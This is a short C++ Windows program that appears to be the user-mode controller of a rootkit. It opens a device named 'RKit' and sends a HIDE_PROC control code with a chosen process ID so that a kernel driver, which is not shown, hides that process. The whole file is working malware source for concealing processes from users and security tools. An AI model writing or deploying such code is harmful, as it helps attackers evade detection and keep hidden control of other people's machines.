#include <Windows.h>
#include <iostream>

#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x3, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main() {

	int userChoice = 0;
	int pid;
	HANDLE deviceObject;
	
	std::cout << "1. Hide Process\n" << "Choose one of the options above to apply: ";
	std::cin >> userChoice;

	if (userChoice == 1)
	{
		std::cout << "Please enter pid: ";
		std::cin >> pid;

	}
	else {
		std::cout << "You entered invalid option!\n";
		return -1;
	}

	deviceObject = CreateFile(L"\\\\.\\RKit", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (deviceObject == INVALID_HANDLE_VALUE) {
		std::cout << "Device cannot be opened!\n";
		return -1;
	}

	std::cout << "Device is opened!\n";

	if (userChoice == 1) {

		int driverOutput = 0;

		if (DeviceIoControl(deviceObject, HIDE_PROC, &pid, sizeof(int), &driverOutput, sizeof(int), 0, NULL)) {
			std::cout << "IOCTL " << std::hex << HIDE_PROC << std::dec << " is sent!\n";
		}
		else {
			std::cout << "FAILED to send" << std::hex << HIDE_PROC << std::dec << " code!\n";
			return -1;
		}

		if (driverOutput) {
			std::cout << "The process with pid " << pid << " has been hidden!\n";
		}

	}
	
	CloseHandle(deviceObject);

	system("pause");
	return 0;
}